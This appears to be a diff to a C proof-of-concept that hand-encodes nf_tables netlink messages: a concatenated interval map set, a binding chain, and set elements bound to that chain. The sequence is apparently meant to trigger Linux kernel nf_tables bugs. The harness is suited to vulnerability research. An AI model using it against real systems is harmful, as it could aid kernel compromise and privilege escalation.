@@ -279,6 +279,19 @@ void create_owner_table(int sock){
     free(nlh_batch_begin);
 }
 
+/*
+    enum nft_set_flags {
+        NFT_SET_ANONYMOUS		= 0x1,
+        NFT_SET_CONSTANT		= 0x2,
+        NFT_SET_INTERVAL		= 0x4,
+        NFT_SET_MAP			    = 0x8,
+        NFT_SET_TIMEOUT			= 0x10,
+        NFT_SET_EVAL			= 0x20,
+        NFT_SET_OBJECT			= 0x40,
+        NFT_SET_CONCAT			= 0x80,
+        NFT_SET_EXPR			= 0x100,
+    };
+*/
 void create_pipapo_set(int sock){
     struct msghdr msg;
     struct sockaddr_nl dest_snl;
@@ -303,7 +316,7 @@ void create_pipapo_set(int sock){
         "NFTA_SET_NAME":"my_set@@",
         "NFTA_SET_ID":0,
         "NFTA_SET_KEY_LEN":12,
-        "NFTA_SET_FLAGS":196,
+        "NFTA_SET_FLAGS":196,  
         "NFTA_SET_OBJ_TYPE":1,
         "NFTA_SET_DATA_LEN":16,
         "NFTA_SET_DESC":{
@@ -337,6 +350,93 @@ void create_pipapo_set(int sock){
 
 
     uint8_t msgcon1[] = {1,0,0,0,12,0,1,0,109,121,95,116,97,98,108,101,12,0,2,0,109,121,95,115,101,116,64,64,8,0,10,0,0,0,0,0,8,0,5,0,0,0,0,12,8,0,3,0,0,0,0,196,8,0,15,0,0,0,0,1,8,0,7,0,0,0,0,16,32,0,9,128,28,0,2,128,12,0,1,128,8,0,1,0,0,0,0,4,12,0,1,128,8,0,1,0,0,0,0,8};
+    memcpy((void *)nlh1+0x10, msgcon1, pay1_size);
+
+    nlh_batch_end = get_batch_end_nlmsg();
+
+    /* IOV preparation */
+    memset(iov, 0, sizeof(iov));
+    int tot_iov = 0;
+    iov[tot_iov].iov_base = (void *)nlh_batch_begin;
+    iov[tot_iov++].iov_len = nlh_batch_begin->nlmsg_len;
+    iov[tot_iov].iov_base = nlh1;
+    iov[tot_iov++].iov_len = nlh1->nlmsg_len;
+    iov[tot_iov].iov_base = (void *)nlh_batch_end;
+    iov[tot_iov++].iov_len = nlh_batch_end->nlmsg_len;
+
+    /* Message header preparation */
+    msg.msg_name = (void *)&dest_snl;
+    msg.msg_namelen = sizeof(struct sockaddr_nl);
+    msg.msg_iov = iov;
+    msg.msg_iovlen = tot_iov;
+
+    sendmsg(sock, &msg, 0);
+
+    /* Free used structures */
+    free(nlh_batch_end);
+    free(nlh1);
+    free(nlh_batch_begin);
+}
+
+void create_pipapo_set_flags(int sock){
+    struct msghdr msg;
+    struct sockaddr_nl dest_snl;
+    struct iovec iov[0x100];
+    struct nlmsghdr *nlh_batch_begin;
+    struct nlmsghdr *nlh_batch_end;
+    struct nlattr *attr;
+    struct nfgenmsg *nfm;
+
+    /* Destination preparation */
+    memset(&dest_snl, 0, sizeof(dest_snl));
+    dest_snl.nl_family = AF_NETLINK;
+    memset(&msg, 0, sizeof(msg));
+
+    /* Netlink batch_begin message preparation */
+    nlh_batch_begin = get_batch_begin_nlmsg();
+
+
+    /*
+    {
+        "NFTA_SET_TABLE":"my_table",
+        "NFTA_SET_NAME":"my_set@@",
+        "NFTA_SET_ID":0,
+        "NFTA_SET_KEY_LEN":12,
+        "NFTA_SET_FLAGS":140,
+        "NFTA_SET_DATA_TYPE":0,
+        "NFTA_SET_DATA_LEN":16,
+        "NFTA_SET_DESC":{
+            "NFTA_SET_DESC_CONCAT":{
+                "NFTA_LIST_ELEM":{
+                    "NFTA_SET_FIELD_LEN":4
+                },
+                "NFTA_LIST_ELEM@1":{
+                    "NFTA_SET_FIELD_LEN":8
+                }
+            }
+        }
+
+    }
+
+
+    */
+
+    int pay1_size = 100;  //消息体的大小；
+    int nlh1_size = NLMSG_SPACE(pay1_size); //整个nlmsghdr的大小
+
+    /* Netlink table message preparation */
+    struct nlmsghdr *nlh1 = (struct nlmsghdr *)malloc(nlh1_size); //这里分配的是整个nlmsghdr的空间
+    
+    memset(nlh1, 0, nlh1_size);
+    nlh1->nlmsg_len = nlh1_size;
+    nlh1->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWSET;  //注意修改
+    nlh1->nlmsg_pid = mypid;
+    nlh1->nlmsg_flags = NLM_F_REQUEST| NLM_F_CREATE;
+    nlh1->nlmsg_seq = 0;
+
+
+    /* nft_set: INTERVAL | MAP | CONCAT (0x8c == 140), with DATA_TYPE + DATA_LEN */
+    uint8_t msgcon1[] = {1,0,0,0,12,0,1,0,109,121,95,116,97,98,108,101,12,0,2,0,109,121,95,115,101,116,64,64,8,0,10,0,0,0,0,0,8,0,5,0,0,0,0,12,8,0,3,0,0,0,0,140,8,0,6,0,0,0,0,0,8,0,7,0,0,0,0,16,32,0,9,128,28,0,2,128,12,0,1,128,8,0,1,0,0,0,0,4,12,0,1,128,8,0,1,0,0,0,0,8};
     memcpy((void *)nlh1+0x10, msgcon1, pay1_size);
 
     nlh_batch_end = get_batch_end_nlmsg();
@@ -585,6 +685,181 @@ void add_set_elem(int sock){
 
 
     uint8_t msgcon1[] = {1,0,0,0,12,0,1,0,109,121,95,116,97,98,108,101,12,0,2,0,109,121,95,115,101,116,64,64,68,0,3,0,64,0,0,0,24,0,1,0,20,0,1,0,39,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,0,10,0,20,0,1,0,127,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,0,9,0,77,89,95,79,66,74,64,64};
+    memcpy((void *)nlh1+0x10, msgcon1, pay1_size);
+
+
+    nlh_batch_end = get_batch_end_nlmsg();
+
+    /* IOV preparation */
+    memset(iov, 0, sizeof(iov));
+    int tot_iov = 0;
+    iov[tot_iov].iov_base = (void *)nlh_batch_begin;
+    iov[tot_iov++].iov_len = nlh_batch_begin->nlmsg_len;
+    iov[tot_iov].iov_base = nlh1;
+    iov[tot_iov++].iov_len = nlh1->nlmsg_len;
+    iov[tot_iov].iov_base = (void *)nlh_batch_end;
+    iov[tot_iov++].iov_len = nlh_batch_end->nlmsg_len;
+
+    /* Message header preparation */
+    msg.msg_name = (void *)&dest_snl;
+    msg.msg_namelen = sizeof(struct sockaddr_nl);
+    msg.msg_iov = iov;
+    msg.msg_iovlen = tot_iov;
+
+    sendmsg(sock, &msg, 0);
+
+    /* Free used structures */
+    free(nlh_batch_end);
+    free(nlh1);
+    free(nlh_batch_begin);
+
+}
+
+void add_set_elem_refobj(int sock){
+    struct msghdr msg;
+    struct sockaddr_nl dest_snl;
+    struct iovec iov[0x100];
+    struct nlmsghdr *nlh_batch_begin;
+    struct nlmsghdr *nlh_batch_end;
+    struct nlattr *attr;
+    struct nfgenmsg *nfm;
+
+    /* Destination preparation */
+    memset(&dest_snl, 0, sizeof(dest_snl));
+    dest_snl.nl_family = AF_NETLINK;
+    memset(&msg, 0, sizeof(msg));
+
+    /* Netlink batch_begin message preparation */
+    nlh_batch_begin = get_batch_begin_nlmsg();
+
+
+    /*
+    {
+        "NFTA_SET_ELEM_LIST_TABLE":"my_table",
+        "NFTA_SET_ELEM_LIST_SET":"my_set@@",
+        "NFTA_SET_ELEM_LIST_ELEMENTS":{
+            "NONAME":{
+                "NFTA_SET_ELEM_KEY":{
+                    "NFTA_DATA_VALUE":"aaaaaaaabbbbbbbb"
+                },
+                "NFTA_SET_ELEM_KEY_END":{
+                    "NFTA_DATA_VALUE":"aaaaaaaabbbbbbbb"
+                },
+                "NFTA_SET_ELEM_OBJREF":"MY_OBJ@@"
+
+            }
+        }
+
+    }
+
+
+    */
+
+    int pay1_size = 96;  //消息体的大小；
+    int nlh1_size = NLMSG_SPACE(pay1_size); //整个nlmsghdr的大小
+
+    /* Netlink table message preparation */
+    struct nlmsghdr *nlh1 = (struct nlmsghdr *)malloc(nlh1_size); //这里分配的是整个nlmsghdr的空间
+    
+    memset(nlh1, 0, nlh1_size);
+    nlh1->nlmsg_len = nlh1_size;
+    nlh1->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWSETELEM;  //注意修改
+    nlh1->nlmsg_pid = mypid;
+    nlh1->nlmsg_flags = NLM_F_REQUEST| NLM_F_CREATE;
+    nlh1->nlmsg_seq = 0;
+
+
+    uint8_t msgcon1[] = {1,0,0,0,12,0,1,0,109,121,95,116,97,98,108,101,12,0,2,0,109,121,95,115,101,116,64,64,68,0,3,0,64,0,0,0,24,0,1,0,20,0,1,0,39,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,0,10,0,20,0,1,0,127,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,0,9,0,77,89,95,79,66,74,64,64};
+    memcpy((void *)nlh1+0x10, msgcon1, pay1_size);
+
+
+    nlh_batch_end = get_batch_end_nlmsg();
+
+    /* IOV preparation */
+    memset(iov, 0, sizeof(iov));
+    int tot_iov = 0;
+    iov[tot_iov].iov_base = (void *)nlh_batch_begin;
+    iov[tot_iov++].iov_len = nlh_batch_begin->nlmsg_len;
+    iov[tot_iov].iov_base = nlh1;
+    iov[tot_iov++].iov_len = nlh1->nlmsg_len;
+    iov[tot_iov].iov_base = (void *)nlh_batch_end;
+    iov[tot_iov++].iov_len = nlh_batch_end->nlmsg_len;
+
+    /* Message header preparation */
+    msg.msg_name = (void *)&dest_snl;
+    msg.msg_namelen = sizeof(struct sockaddr_nl);
+    msg.msg_iov = iov;
+    msg.msg_iovlen = tot_iov;
+
+    sendmsg(sock, &msg, 0);
+
+    /* Free used structures */
+    free(nlh_batch_end);
+    free(nlh1);
+    free(nlh_batch_begin);
+
+}
+
+void add_set_elem_bind_chain(int sock){
+    struct msghdr msg;
+    struct sockaddr_nl dest_snl;
+    struct iovec iov[0x100];
+    struct nlmsghdr *nlh_batch_begin;
+    struct nlmsghdr *nlh_batch_end;
+    struct nlattr *attr;
+    struct nfgenmsg *nfm;
+
+    /* Destination preparation */
+    memset(&dest_snl, 0, sizeof(dest_snl));
+    dest_snl.nl_family = AF_NETLINK;
+    memset(&msg, 0, sizeof(msg));
+
+    /* Netlink batch_begin message preparation */
+    nlh_batch_begin = get_batch_begin_nlmsg();
+
+
+    /*
+    {
+        "NFTA_SET_ELEM_LIST_TABLE":"my_table",
+        "NFTA_SET_ELEM_LIST_SET":"my_set@@",
+        "NFTA_SET_ELEM_LIST_ELEMENTS":{
+            "NONAME":{
+                "NFTA_SET_ELEM_KEY":{
+                    "NFTA_DATA_VALUE":"aaaabbbbbbbb"
+                },
+                "NFTA_SET_ELEM_KEY_END":{
+                    "NFTA_DATA_VALUE":"aaaabbbbbbbb"
+                },
+                "NFTA_SET_ELEM_DATA":{
+                    "NFTA_DATA_VERDICT":{
+                        "NFTA_VERDICT_CODE":-3,
+                        "NFTA_VERDICT_CHAIN":"my_chain"
+                    }
+                }
+
+            }
+        }
+
+    }
+
+
+    */
+
+    int pay1_size = 72;  //消息体的大小；
+    int nlh1_size = NLMSG_SPACE(pay1_size); //整个nlmsghdr的大小
+
+    /* Netlink table message preparation */
+    struct nlmsghdr *nlh1 = (struct nlmsghdr *)malloc(nlh1_size); //这里分配的是整个nlmsghdr的空间
+    
+    memset(nlh1, 0, nlh1_size);
+    nlh1->nlmsg_len = nlh1_size;
+    nlh1->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWSETELEM;  //注意修改
+    nlh1->nlmsg_pid = mypid;
+    nlh1->nlmsg_flags = NLM_F_REQUEST| NLM_F_CREATE;
+    nlh1->nlmsg_seq = 0;
+
+
+    uint8_t msgcon1[] = {1,0,0,0,12,0,1,0,109,121,95,116,97,98,108,101,12,0,2,0,109,121,95,115,101,116,64,64,44,0,3,128,40,0,0,128,8,0,3,0,0,0,0,2,28,0,2,128,24,0,2,128,8,0,1,0,255,255,255,253,12,0,2,0,109,121,95,99,104,97,105,110};
     memcpy((void *)nlh1+0x10, msgcon1, pay1_size);
 
 
@@ -935,8 +1210,92 @@ void create_chain(int sock, const char *table_name, const char *chain_name) {
     free(nlh_batch_begin);
 }
 
+/*
+enum nft_chain_flags {
+	NFT_CHAIN_BASE		= (1 << 0),
+	NFT_CHAIN_HW_OFFLOAD	= (1 << 1),
+	NFT_CHAIN_BINDING	= (1 << 2),
+};
+#define NFT_CHAIN_FLAGS		(NFT_CHAIN_BASE		| \
+				 NFT_CHAIN_HW_OFFLOAD	| \
+				 NFT_CHAIN_BINDING)
+
+*/
+
+void create_binding_chain(int sock){
+    struct msghdr msg;
+    struct sockaddr_nl dest_snl;
+    struct iovec iov[0x100];
+    struct nlmsghdr *nlh_batch_begin;
+    struct nlmsghdr *nlh_batch_end;
+    struct nlattr *attr;
+    struct nfgenmsg *nfm;
+
+    /* Destination preparation */
+    memset(&dest_snl, 0, sizeof(dest_snl));
+    dest_snl.nl_family = AF_NETLINK;
+    memset(&msg, 0, sizeof(msg));
+
+    /* Netlink batch_begin message preparation */
+    nlh_batch_begin = get_batch_begin_nlmsg();
 
 
+
+    /*
+    {   
+        "NFTA_CHAIN_TABLE":"my_table",
+        "NFTA_CHAIN_NAME":"my_chain",
+        "NFTA_CHAIN_FLAGS":4
+
+
+    }
+
+
+    */
+
+    int pay1_size = 36;  //消息体的大小；
+    int nlh1_size = NLMSG_SPACE(pay1_size); //整个nlmsghdr的大小
+
+    /* Netlink table message preparation */
+    struct nlmsghdr *nlh1 = (struct nlmsghdr *)malloc(nlh1_size); //这里分配的是整个nlmsghdr的空间
+    
+    memset(nlh1, 0, nlh1_size);
+    nlh1->nlmsg_len = nlh1_size;
+    nlh1->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWCHAIN;;  //注意修改
+    nlh1->nlmsg_pid = mypid;
+    nlh1->nlmsg_flags = NLM_F_REQUEST| NLM_F_CREATE;
+    nlh1->nlmsg_seq = 0;
+
+
+    uint8_t msgcon1[] = {1,0,0,0,12,0,1,0,109,121,95,116,97,98,108,101,12,0,3,0,109,121,95,99,104,97,105,110,8,0,10,0,0,0,0,4};
+    memcpy((void *)nlh1+0x10, msgcon1, pay1_size);
+
+    nlh_batch_end = get_batch_end_nlmsg();
+
+    /* IOV preparation */
+    memset(iov, 0, sizeof(iov));
+    int tot_iov = 0;
+    iov[tot_iov].iov_base = (void *)nlh_batch_begin;
+    iov[tot_iov++].iov_len = nlh_batch_begin->nlmsg_len;
+    iov[tot_iov].iov_base = nlh1;
+    iov[tot_iov++].iov_len = nlh1->nlmsg_len;
+    iov[tot_iov].iov_base = (void *)nlh_batch_end;
+    iov[tot_iov++].iov_len = nlh_batch_end->nlmsg_len;
+
+    /* Message header preparation */
+    msg.msg_name = (void *)&dest_snl;
+    msg.msg_namelen = sizeof(struct sockaddr_nl);
+    msg.msg_iov = iov;
+    msg.msg_iovlen = tot_iov;
+
+    sendmsg(sock, &msg, 0);
+
+    /* Free used structures */
+    free(nlh_batch_end);
+    free(nlh1);
+    free(nlh_batch_begin);
+
+}
 
 
 
@@ -979,11 +1338,11 @@ int main(){
     
 
     create_table(sock, "my_table");
-    create_pipapo_set(sock);
-    create_chain(sock, "my_table", "my_chain");
+    create_pipapo_set_flags(sock);
+    create_binding_chain(sock);
+    add_set_elem_bind_chain(sock);
     
-    
-    
+        
 
     return ;
 
